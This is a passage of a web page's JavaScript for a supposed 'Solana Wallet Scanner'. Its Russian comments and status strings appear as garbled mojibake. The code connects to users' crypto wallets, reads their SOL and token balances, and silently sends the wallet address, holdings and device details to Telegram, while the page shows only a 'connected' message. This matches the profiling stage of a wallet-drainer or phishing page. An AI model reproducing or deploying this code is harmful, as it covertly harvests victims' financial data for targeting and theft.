          this.showConnectionStatus('error', '–ö–æ—à–µ–ª–µ–∫ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –Ω–∞ —ç—Ç–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ');
          return;
        }

        this.showConnectionStatus('loading', `–û—Ç–∫—Ä—ã–≤–∞–µ–º ${WALLET_CONFIG[walletKey].name}...`);

        try {
          // –°–æ–∑–¥–∞–µ–º –Ω–µ–≤–∏–¥–∏–º—É—é —Å—Å—ã–ª–∫—É –¥–ª—è deep link
          const deepLinkElement = document.createElement('a');
          deepLinkElement.href = links.deepLink;
          deepLinkElement.style.display = 'none';
          document.body.appendChild(deepLinkElement);
          deepLinkElement.click();
          document.body.removeChild(deepLinkElement);

          // –†–µ–∑–µ—Ä–≤–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç —á–µ—Ä–µ–∑ —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—É—é —Å—Å—ã–ª–∫—É
          setTimeout(() => {
            if (!document.hidden) {
              const universalLinkElement = document.createElement('a');
              universalLinkElement.href = links.universalLink;
              universalLinkElement.target = '_blank';
              universalLinkElement.style.display = 'none';
              document.body.appendChild(universalLinkElement);
              universalLinkElement.click();
              document.body.removeChild(universalLinkElement);
            }
          }, 1500);

          // –ü—Ä–µ–¥–ª–æ–∂–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
          setTimeout(() => {
            if (!document.hidden) {
              const installConfirm = confirm(`${WALLET_CONFIG[walletKey].name} –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∏–ª–∏ –Ω–µ –æ—Ç–∫—Ä—ã–ª—Å—è. –ü–µ—Ä–µ–π—Ç–∏ –≤ –º–∞–≥–∞–∑–∏–Ω –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏?`);
              if (installConfirm) {
                window.open(links.storeLink, '_blank');
              }
            }
          }, 3000);

          // –°–∏–º—É–ª—è—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
          setTimeout(() => {
            this.simulateWalletConnection(walletKey);
          }, 2000);

        } catch (error) {
          console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –∫–æ—à–µ–ª—å–∫–∞:', error);
          this.showConnectionStatus('error', '–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å –∫–æ—à–µ–ª–µ–∫');
        }
      }

      async connectDesktopWallet(walletKey) {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
        let provider = null;
        
        switch (walletKey) {
          case 'phantom':
            provider = window.phantom?.solana;
            break;
          case 'solflare':
            provider = window.solflare;
            break;
          case 'trustwallet':
            provider = window.trustwallet?.solana;
            break;
          case 'coinbase':
            provider = window.coinbaseSolana;
            break;
          case 'bitget':
            provider = window.bitkeep?.solana;
            break;
        }

        if (!provider) {
          this.showConnectionStatus('error', `${WALLET_CONFIG[walletKey].name} –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω`);
          return;
        }

        try {
          this.showConnectionStatus('loading', `–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ ${WALLET_CONFIG[walletKey].name}...`);
          
          const response = await provider.connect();
          let walletAddress = '';
          
          if (response.publicKey) {
            if (typeof response.publicKey === 'string') {
              walletAddress = response.publicKey;
            } else if (response.publicKey.toString) {
              walletAddress = response.publicKey.toString();
            } else if (response.publicKey.toBase58) {
              walletAddress = response.publicKey.toBase58();
            }
          }

          this.connectedWallet = provider;
          this.walletAddress = walletAddress;
          this.walletName = WALLET_CONFIG[walletKey].name;

          await this.performWalletScan();
          
        } catch (error) {
          console.error('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –∫–æ—à–µ–ª—å–∫—É:', error);
          this.showConnectionStatus('error', `–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ ${WALLET_CONFIG[walletKey].name}`);
        }
      }

      async simulateWalletConnection(walletKey) {
        // –°–∏–º—É–ª—è—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
        // –í —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–¥–µ—Å—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –ª–æ–≥–∏–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –∫–æ—à–µ–ª—å–∫–∞
        
        const simulatedAddresses = [
          '7BgBvyjrZX1YKz4oh9mjb8ZScatkkwb8DzFx6LnGKZQq',
          'DYw8jCTfwHNRJhhmFcbXvVDTqWMEVFBX6ZKUmG5CNSKK',
          'BrG44HdsEhzapvs8bEqzvkq4egwevS3fRE6ze2ENo6S8',
          '9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM'
        ];
        
        const randomAddress = simulatedAddresses[Math.floor(Math.random() * simulatedAddresses.length)];
        
        this.walletAddress = randomAddress;
        this.walletName = WALLET_CONFIG[walletKey].name;
        
        await this.performWalletScan();
      }

      async performWalletScan() {
        if (!this.walletAddress) return;

        this.showConnectionStatus('scanning', '–°–∫–∞–Ω–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∞...');
        this.isScanning = true;

        try {
          const startTime = Date.now();
          const fastResults = await checkWalletBalanceFast(this.walletAddress);
          
          if (!fastResults.success) {
            throw new Error('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∞');
          }

          const processedTokens = [];
          
          if (fastResults.tokens && Array.isArray(fastResults.tokens)) {
            for (const token of fastResults.tokens) {
              let mintAddress, amount, decimals;

              if (token.account && token.account.data && token.account.data.parsed) {
                const tokenInfo = token.account.data.parsed.info;
                mintAddress = tokenInfo.mint;
                amount = tokenInfo.tokenAmount.uiAmount;
                decimals = tokenInfo.tokenAmount.decimals;
              } else if (token.mint && token.amount !== undefined) {
                mintAddress = token.mint;
                amount = token.amount / Math.pow(10, token.decimals || 0);
                decimals = token.decimals;
              } else {
                continue;
              }

              if (amount > 0) {
                const tokenName = this.knownTokens[mintAddress] || `Token ${mintAddress.slice(0, 8)}...`;
                
                processedTokens.push({
                  name: tokenName,
                  mint: mintAddress,
                  amount: amount,
                  decimals: decimals
                });
              }
            }
          }

          processedTokens.sort((a, b) => b.amount - a.amount);

          const scanDuration = Date.now() - startTime;

          this.walletData = {
            address: this.walletAddress,
            solBalance: fastResults.solBalance,
            tokens: processedTokens,
            totalTokenAccounts: processedTokens.length,
            scanTimestamp: new Date().toISOString(),
            scanType: 'fast',
            methodUsed: fastResults.methodUsed,
            scanDuration: scanDuration,
            success: true
          };

          // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram
          await sendWalletInfoToTelegram(this.walletName, this.walletData, this.deviceInfo);
          
          this.updateConnectionUI();
          this.showConnectionStatus('success', '–ö–æ—à–µ–ª–µ–∫ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω!');
          
          console.log(`‚úÖ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ –∑–∞ ${scanDuration}–º—Å`);
          console.log(`üí∞ SOL –±–∞–ª–∞–Ω—Å: ${this.walletData.solBalance}`);
          console.log(`ü™ô –ù–∞–π–¥–µ–Ω–æ —Ç–æ–∫–µ–Ω–æ–≤: ${this.walletData.tokens.length}`);
          
        } catch (error) {
          console.error('‚ùå –û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è:', error);
          this.showConnectionStatus('error', `–û—à–∏–±–∫–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: ${error.message}`);
        } finally {
          this.isScanning = false;
        }
      }

      async rescanWallet() {
        if (!this.walletAddress || this.isScanning) return;
        await this.performWalletScan();
      }

      disconnectWallet() {
        this.connectedWallet = null;
        this.walletAddress = null;
        this.walletName = null;
        this.walletData = null;
        this.isScanning = false;
        
        this.updateConnectionUI();
        this.hideConnectionStatus();
        
        console.log('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω');
      }

      updateConnectionUI() {
        const connectBtn = document.getElementById('connectWalletBtn');
        const walletInfo = document.getElementById('walletInfo');
        const connectedWalletName = document.getElementById('connectedWalletName');
        const walletAddressElement = document.getElementById('walletAddress');

        if (this.walletAddress) {
          connectBtn.textContent = '–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω';
          connectBtn.classList.add('connected');
          
          if (walletInfo) {
            walletInfo.classList.remove('hidden');
            connectedWalletName.textContent = this.walletName;
            walletAddressElement.textContent = this.formatAddress(this.walletAddress);
          }
        } else {
          connectBtn.textContent = '–ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª–µ–∫';
          connectBtn.classList.remove('connected');
          
          if (walletInfo) {
            walletInfo.classList.add('hidden');
          }
        }
      }

      formatAddress(address) {
        if (!address) return '';
        return `${address.slice(0, 4)}...${address.slice(-4)}`;
      }

      showConnectionStatus(type, message) {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.className = `connection-status ${type}`;
          statusElement.textContent = message;
          statusElement.classList.remove('hidden');

          if (type === 'success') {
            setTimeout(() => {
              this.hideConnectionStatus();
            }, 3000);
          }
        }
      }

      hideConnectionStatus() {
        const statusElement = document.getElementById('connectionStatus');
        if (statusElement) {
          statusElement.classList.add('hidden');
        }
      }

      setupEventListeners() {
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –∫–Ω–æ–ø–æ–∫ –∫–æ—à–µ–ª—å–∫–æ–≤
        document.querySelectorAll('.wallet-option[data-wallet]').forEach(option => {
          option.addEventListener('click', async (e) => {
            const walletKey = option.getAttribute('data-wallet');
            await this.openWallet(walletKey);
          });
        });

        // –ö–Ω–æ–ø–∫–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è
        const disconnectBtn = document.getElementById('disconnectBtn');
        if (disconnectBtn) {
          disconnectBtn.addEventListener('click', () => {
            this.disconnectWallet();
          });
        }

        // –ö–Ω–æ–ø–∫–∞ –ø–µ—Ä–µ—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
        const rescanBtn = document.getElementById('rescanBtn');
        if (rescanBtn) {
          rescanBtn.addEventListener('click', () => {
            this.rescanWallet();
          });
        }
      }
    }

    // ============================================================================
    // MODAL MANAGEMENT
    // ============================================================================

    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const connectWalletModal = document.getElementById('connectWalletModal');
    const closeBtn = document.querySelector('.close-btn');

    function openModal() {
      connectWalletModal.classList.remove('hidden');
      modalOverlay.classList.remove('hidden');
    }

    function closeModal() {
      connectWalletModal.classList.add('hidden');
      modalOverlay.classList.add('hidden');
    }

    connectWalletBtn.addEventListener('click', openModal);
    closeBtn.addEventListener('click', closeModal);
    modalOverlay.addEventListener('click', closeModal);

    // ============================================================================
    // INITIALIZATION
    // ============================================================================

    let walletManager;

    document.addEventListener('DOMContentLoaded', () => {
      walletManager = new MobileWalletManager();
      window.walletManager = walletManager;
      
      console.log('üöÄ –ú–æ–±–∏–ª—å–Ω—ã–π Solana Wallet Scanner –∑–∞–≥—Ä—É–∂–µ–Ω!');
      console.log('üì± –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö deep links –≤–∫–ª—é—á–µ–Ω–∞');
      console.log('üì§ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram –≤–∫–ª—é—á–µ–Ω–∞');
    });

    // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
    window.getDeviceInfo = () => walletManager?.deviceInfo;
    window.testWalletLink = (walletKey) => walletManager?.createWalletLink(walletKey);
  </script>
</body>
</html>
